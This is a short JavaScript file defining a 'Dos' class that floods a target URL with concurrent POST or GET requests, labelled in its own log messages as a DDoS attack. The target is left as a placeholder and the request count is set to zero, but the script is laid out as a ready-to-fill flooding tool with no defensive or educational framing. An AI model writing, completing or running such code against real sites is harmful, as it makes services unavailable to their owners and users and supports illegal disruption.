const https = require('https');

class Dos {
    constructor() {
        this.USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
        this.amount = 0;
        this.url = "";
    }

    async checkConnection(url) {
        console.log("Checking Connection");
        try {
            const response = await fetch(url);
            if (response.ok) {
                console.log("Connected to website");
            }
            this.url = url;
        } catch (error) {
            console.error("Error checking connection:", error);
        }
    }

    async postAttack(url) {
        try {
            const options = {
                method: 'POST',
                headers: {
                    'User-Agent': this.USER_AGENT,
                    'Accept-Language': 'en-US,en;'
                },
                body: 'out of memory'
            };
            const response = await fetch(url, options);
            console.log("POST attack done!: " + response.status);
        } catch (error) {
            console.error("Error performing POST attack:", error);
        }
    }

    async getAttack(url) {
        try {
            const options = {
                method: 'GET',
                headers: {
                    'User-Agent': this.USER_AGENT
                }
            };
            const response = await fetch(url, options);
            console.log("GET attack done!: " + response.status);
        } catch (error) {
            console.error("Error performing GET attack:", error);
        }
    }

    async startAttack() {
        try {
            const url = "your_target_url_here";
            console.log("Starting Attack to url: " + url);
            await this.checkConnection(url);
            console.log("Setting DDoS");
            const threads = [];
            for (let i = 0; i < this.amount; i++) {
                threads.push(this.postAttack(url)); // You can change this to getAttack if needed
            }
            await Promise.all(threads);
            console.log("Main Thread ended");
        } catch (error) {
            console.error("Error starting attack:", error);
        }
    }
}

(async () => {
    const dos = new Dos();
    await dos.startAttack();
})();
